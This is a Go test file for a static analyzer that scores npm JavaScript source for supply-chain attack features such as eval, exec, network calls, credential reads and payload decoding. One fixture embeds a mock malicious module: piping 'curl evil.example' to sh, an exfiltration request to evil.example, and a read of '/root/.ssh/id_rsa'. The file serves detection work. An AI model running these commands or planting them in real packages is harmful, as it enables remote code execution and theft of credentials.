package node

import (
	"context"
	"errors"
	"iter"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// seq builds an iter.Seq2 from explicit (file, err) pairs so tests
// can drive the analyzer's stream-error and drain behavior exactly.
func seq(pairs ...struct {
	f   astfeature.SourceFile
	err error
}) iter.Seq2[astfeature.SourceFile, error] {
	return func(yield func(astfeature.SourceFile, error) bool) {
		for _, p := range pairs {
			if !yield(p.f, p.err) {
				return
			}
		}
	}
}

type fe = struct {
	f   astfeature.SourceFile
	err error
}

func TestAnalyzer_Language(t *testing.T) {
	t.Parallel()
	assert.Equal(t, "javascript", NewAnalyzer().Language(),
		"Language() feeds ecosystemForLanguage(\"javascript\")→\"npm\"")
}

func TestAnalyzer_Analyze_CleanFileHasZeroCounts(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "src/index.js", Content: []byte(
			"function add(a, b) { return a + b; }\nmodule.exports = { add };\n")}},
	))
	require.NoError(t, err)
	assert.Equal(t, astfeature.Counts{}, counts,
		"a benign module that only defines/exports functions spikes nothing")
}

// TestAnalyzer_Analyze_WeaponizedModulePayload is the load-bearing
// adversarial fixture: the dominant npm supply-chain shape — a
// require()'d child_process running a shell command, network exfil,
// credential read, and eval, all at module (import/require) time.
// Every counted field must light up; the function body's eval must
// NOT inflate ImportTimeCallSites.
func TestAnalyzer_Analyze_WeaponizedModulePayload(t *testing.T) {
	t.Parallel()
	src := "" +
		"const cp = require('child_process');\n" +
		"cp.execSync('curl evil.example | sh');\n" +
		"require('https').get('http://evil.example/exfil');\n" +
		"const fs = require('fs');\n" +
		"fs.readFileSync('/root/.ssh/id_rsa');\n" +
		"let k = 0;\n" +
		"k ^= 0x37;\n" +
		"eval(payload);\n" +
		"function helper() { eval(x); }\n"
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "index.js", Content: []byte(src)}},
	))
	require.NoError(t, err)

	assert.Equal(t, 2, c.DynamicEvalCalls, "eval at module scope + eval in helper()")
	assert.Equal(t, 1, c.ExecCalls, "child_process.execSync via require-bound alias")
	assert.Equal(t, 1, c.NetworkCallSites, "https.get via inline require chain")
	assert.Equal(t, 1, c.SensitivePathReads, "fs.readFileSync('/root/.ssh/id_rsa')")
	assert.Equal(t, 1, c.XORAssignments, "k ^= 0x37")
	assert.Equal(t, 4, c.ImportTimeCallSites,
		"module-scope calls: cp.execSync, https.get, fs.readFileSync, eval "+
			"(the eval in helper() is NOT import-time)")
	assert.Equal(t, 0, c.InitCount, "no Go-style init analog")
	assert.Equal(t, 0, c.InstallHookOverrides,
		"npm install hooks are package.json scripts (covered by the npm "+
			"registry collector), never source — stays 0 by design")
}

// TestAnalyzer_Analyze_DynamicEvalIsSpecific: a method merely named
// .eval / .exec, and regex .exec, must NOT count as code-from-data
// execution. Only bare eval, the Function constructor, and vm.run* do.
// Miscounting .exec would spike on the first regex a package uses.
func TestAnalyzer_Analyze_DynamicEvalIsSpecific(t *testing.T) {
	t.Parallel()
	src := "" +
		"const re = /x/;\n" +
		"re.exec(s);\n" + // regex exec — NOT dynamic eval
		"db.query(q).eval();\n" + // method named eval — NOT
		"eval(p);\n" + // dynamic eval
		"new Function('a', 'return a')();\n" + // dynamic eval (Function ctor)
		"vm.runInThisContext(code);\n" // dynamic eval
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, c.DynamicEvalCalls,
		"only bare eval, new Function, vm.runInThisContext — not re.exec or .eval()")
}

// TestAnalyzer_Analyze_PayloadDecodeCatalog: obfuscated stages arrive
// gzip/inflate/brotli-compressed or atob-encoded. The Base64DecodeCalls
// field is "opaque payload decode" by intent. JSON.parse / ordinary
// string ops must not count.
func TestAnalyzer_Analyze_PayloadDecodeCatalog(t *testing.T) {
	t.Parallel()
	src := "" +
		"atob(blob);\n" +
		"zlib.gunzipSync(buf);\n" +
		"zlib.brotliDecompressSync(buf);\n" +
		"JSON.parse(s);\n" + // NOT a payload decode
		"s.trim();\n" // NOT
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "d.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, c.Base64DecodeCalls,
		"atob + zlib.gunzipSync + zlib.brotliDecompressSync; not JSON.parse/trim")
}

// TestAnalyzer_Analyze_NodeSchemeSpecifier: ESM `node:` builtin
// specifiers must resolve the same as the bare names so the catalog
// matches `import { execSync } from 'node:child_process'`.
func TestAnalyzer_Analyze_NodeSchemeSpecifier(t *testing.T) {
	t.Parallel()
	src := "" +
		"import { execSync } from 'node:child_process';\n" +
		"execSync('id');\n"
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "esm.mjs", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 1, c.ExecCalls,
		"node:child_process must normalize to child_process for catalog match")
}

// TestAnalyzer_Analyze_BenignNetworkClientScoresZeroExec: a typical
// library that does an https.get inside an exported function flags
// NetworkCallSites (the catalog is scope-independent) but must not
// invent exec/eval/credential signal — the no-false-positive baseline.
func TestAnalyzer_Analyze_BenignNetworkClientScoresZero(t *testing.T) {
	t.Parallel()
	src := "" +
		"const https = require('https');\n" +
		"function fetchThing(u, cb) { return https.get(u, cb); }\n" +
		"module.exports = fetchThing;\n"
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "client.js", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 1, c.NetworkCallSites, "https.get is real network surface")
	assert.Equal(t, 0, c.ExecCalls)
	assert.Equal(t, 0, c.DynamicEvalCalls)
	assert.Equal(t, 0, c.SensitivePathReads)
	assert.Equal(t, 0, c.ImportTimeCallSites,
		"the only call is inside an exported function — nothing runs on require")
}

func TestAnalyzer_Analyze_LenientOnUnparseableFile(t *testing.T) {
	t.Parallel()
	// A garbage file contributes nothing rather than aborting the
	// version's whole tree; a following good file still counts.
	a := NewAnalyzer()
	c, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "broken.ts", Content: []byte("}{)(=>=>`${")}},
		fe{f: astfeature.SourceFile{Path: "ok.js", Content: []byte("eval(x);\n")}},
	))
	require.NoError(t, err)
	assert.Equal(t, 1, c.DynamicEvalCalls, "the good file still contributes")
}

func TestAnalyzer_Analyze_PropagatesUpstreamStreamError(t *testing.T) {
	t.Parallel()
	// Same contract as golang.Analyzer: a mid-stream provider error
	// aborts with that error rather than silently yielding empty
	// counts, so the assembler does not record a misleading all-zero
	// row.
	wantErr := errors.New("blob fetch boom")
	a := NewAnalyzer()
	_, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "ok.js", Content: []byte("x = 1;\n")}},
		fe{err: wantErr},
	))
	assert.ErrorIs(t, err, wantErr)
}

func TestAnalyzer_Analyze_HonorsContextCancellation(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	_, err := a.Analyze(ctx, seq(
		fe{f: astfeature.SourceFile{Path: "a.js", Content: []byte("x = 1;\n")}},
	))
	assert.ErrorIs(t, err, ctx.Err())
}
